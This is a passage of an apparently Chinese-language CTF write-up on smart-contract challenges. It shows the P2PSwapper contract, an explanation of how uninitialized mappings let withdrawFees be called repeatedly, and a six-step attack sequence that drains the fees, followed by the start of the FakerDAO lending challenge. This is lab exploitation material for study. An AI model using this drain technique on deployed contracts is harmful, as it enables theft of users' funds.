punctuation\">.</span>deposit<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        partnerFees<span class=\"token punctuation\">[</span>userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> partnerFees<span class=\"token punctuation\">[</span>userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>fee<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        TransferHelper<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>bidToken<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> bidPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        dealId <span class=\"token operator\">=</span> <span class=\"token function\">_createDeal</span><span class=\"token punctuation\">(</span>bidToken<span class=\"token punctuation\">,</span> bidPrice<span class=\"token punctuation\">,</span> askToken<span class=\"token punctuation\">,</span> askAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">takeDeal</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> dealId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>dealCount <span class=\"token operator\">>=</span> dealId <span class=\"token operator\">&amp;&amp;</span> dealId <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: deal not found\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        Deal <span class=\"token keyword\">storage</span> deal <span class=\"token operator\">=</span> deals<span class=\"token punctuation\">[</span>dealId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: deal not available\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        TransferHelper<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>askToken<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> deal<span class=\"token punctuation\">.</span>initiator<span class=\"token punctuation\">,</span> deal<span class=\"token punctuation\">.</span>askAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_takeDeal</span><span class=\"token punctuation\">(</span>dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">cancelDeal</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> dealId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>dealCount <span class=\"token operator\">>=</span> dealId <span class=\"token operator\">&amp;&amp;</span> dealId <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: deal not found\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        Deal <span class=\"token keyword\">storage</span> deal <span class=\"token operator\">=</span> deals<span class=\"token punctuation\">[</span>dealId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>initiator <span class=\"token operator\">==</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: access denied\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        TransferHelper<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>bidToken<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> deal<span class=\"token punctuation\">.</span>bidPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">CancelDeal</span><span class=\"token punctuation\">(</span>dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">status</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> dealId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span>DealState<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>dealCount <span class=\"token operator\">>=</span> dealId <span class=\"token operator\">&amp;&amp;</span> dealId <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: deal not found\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Deal <span class=\"token keyword\">storage</span> deal <span class=\"token operator\">=</span> deals<span class=\"token punctuation\">[</span>dealId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> DealState<span class=\"token punctuation\">.</span>Succeeded<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">DealState</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> DealState<span class=\"token punctuation\">.</span>Active<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">dealHistory</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> user\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _dealHistory<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">signup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">signup</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">signup</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> partnerId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> id<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: user exists\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>addressById<span class=\"token punctuation\">[</span>partnerId<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: partner not found\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        id <span class=\"token operator\">=</span> <span class=\"token operator\">++</span>userCount<span class=\"token punctuation\">;</span>\n        userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> id<span class=\"token punctuation\">;</span>\n        addressById<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        partnerById<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> partnerId<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">NewUser</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> partnerId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdrawFees</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> user<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> nonReentrant <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> fees<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> userId <span class=\"token operator\">=</span> userByAddress<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>partnerById<span class=\"token punctuation\">[</span>userId<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: user is not your referral\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        fees <span class=\"token operator\">=</span> partnerFees<span class=\"token punctuation\">[</span>userId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>distributedFees<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>fees <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: no fees to distribute\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        distributedFees<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> distributedFees<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>fees<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        p2pweth<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>fees<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        TransferHelper<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferETH</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> fees<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">WithdrawFees</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> userId<span class=\"token punctuation\">,</span> fees<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_createDeal</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> bidToken<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> bidPrice<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> askToken<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> askAmount\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> dealId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>askToken <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: invalid address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>bidPrice <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: invalid bid price\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>askAmount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: invalid ask amount\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        dealId <span class=\"token operator\">=</span> <span class=\"token operator\">++</span>dealCount<span class=\"token punctuation\">;</span>\n        Deal <span class=\"token keyword\">storage</span> deal <span class=\"token operator\">=</span> deals<span class=\"token punctuation\">[</span>dealId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        deal<span class=\"token punctuation\">.</span>initiator <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        deal<span class=\"token punctuation\">.</span>bidToken <span class=\"token operator\">=</span> bidToken<span class=\"token punctuation\">;</span>\n        deal<span class=\"token punctuation\">.</span>bidPrice <span class=\"token operator\">=</span> bidPrice<span class=\"token punctuation\">;</span>\n        deal<span class=\"token punctuation\">.</span>askToken <span class=\"token operator\">=</span> askToken<span class=\"token punctuation\">;</span>\n        deal<span class=\"token punctuation\">.</span>askAmount <span class=\"token operator\">=</span> askAmount<span class=\"token punctuation\">;</span>\n        \n        _dealHistory<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">emit</span> <span class=\"token function\">NewDeal</span><span class=\"token punctuation\">(</span>bidToken<span class=\"token punctuation\">,</span> bidPrice<span class=\"token punctuation\">,</span> askToken<span class=\"token punctuation\">,</span> askAmount<span class=\"token punctuation\">,</span> dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_takeDeal</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> dealId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span> \n        Deal <span class=\"token keyword\">storage</span> deal <span class=\"token operator\">=</span> deals<span class=\"token punctuation\">[</span>dealId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        TransferHelper<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span>deal<span class=\"token punctuation\">.</span>bidToken<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> deal<span class=\"token punctuation\">.</span>bidPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        deal<span class=\"token punctuation\">.</span>status <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">TakeDeal</span><span class=\"token punctuation\">(</span>dealId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>p2pweth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: transfer not allowed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Analyze-2\"><a href=\"#Analyze-2\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h3><p>存在未初始化的问题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205151944586.png\"></p>\n<p>在进行任何操作之前，一切uint数据类型的初始值都是0</p>\n<p>所以在withdrawfee时候每次换一个user（未初始化过的），distributedFees[user]&#x3D;0、userId&#x3D;userByAddress[user]&#x3D;0、partnerById[userId]&#x3D;0所以在fees &#x3D; partnerFees[userId].sub(distributedFees[user])语句赋值时候减数都是0，所以可以重复withdraw</p>\n<h3 id=\"Attack-2\"><a href=\"#Attack-2\" class=\"headerlink\" title=\"Attack\"></a>Attack</h3><p>清楚了漏洞原理，接下来就是进行攻击，原本的partnerFees[0]值为0，所以要先createDeal(p2pweth, 1, p2pweth, 1) {value:313338}。（在此之前要先deposit{value:1}并且approve(instance,1)以满足create中的transferfrom操作）此时P2PSwapper合约instance的余额 balanceOf([nstance]&#x3D; 313338+1+313338 &#x3D; 626677，partnerFees[0]变为156669，balanceOf([nstance]&#x3D;626677并非156669的整数倍（商四余一），所以只有让合约余额为156669的5倍即156669*5&#x3D;783345，差156,668，所以deposit{value:156668}，再把刚刚deposit的token转到instance中。</p>\n<p>再分别使用5个未初始化过的账户进行withdrawfee即可</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">step1：deposit&#123;value:1&#125;\nstep2：approve(instance,1)\nstep3：createDeal(p2pweth, 1, p2pweth, 1) &#123;value:313338&#125;\nstep4：deposit&#123;value:156668&#125;\nstep5：transfer(instance,156668)\nstep6：withdrawFees*5  每次user都是不同的且未初始化过<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205152115470.png\"></p>\n<h2 id=\"4-FakerDAO\"><a href=\"#4-FakerDAO\" class=\"headerlink\" title=\"4.FakerDAO\"></a>4.FakerDAO</h2><h3 id=\"Request-3\"><a href=\"#Request-3\" class=\"headerlink\" title=\"Request\"></a>Request</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>FakerDAO is the best lending protocol! Only at FakerDAO you can borrow a LAMBO if you provide enough collateral in LP tokens!</p></blockquote>\n<p>You have 5000 YIN and 5000 YANG, can you borrow 1 LAMBO?</p>\n<h3 id=\"Code-3\"><a href=\"#Code-3\" class=\"headerlink\" title=\"Code\"></a>Code</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FakerDAO</span> <span class=\"token keyword\">is</span> ERC20<span class=\"token punctuation\">,</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> immutable pair<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _pair<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lambo\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"LAMBO\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_setupDecimals</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pair <span class=\"token operator\">=</span> _pair<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Uniswap YIN-YANG pair</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> _balance <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> _tokenPrice <span class=\"token operator\">=</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token 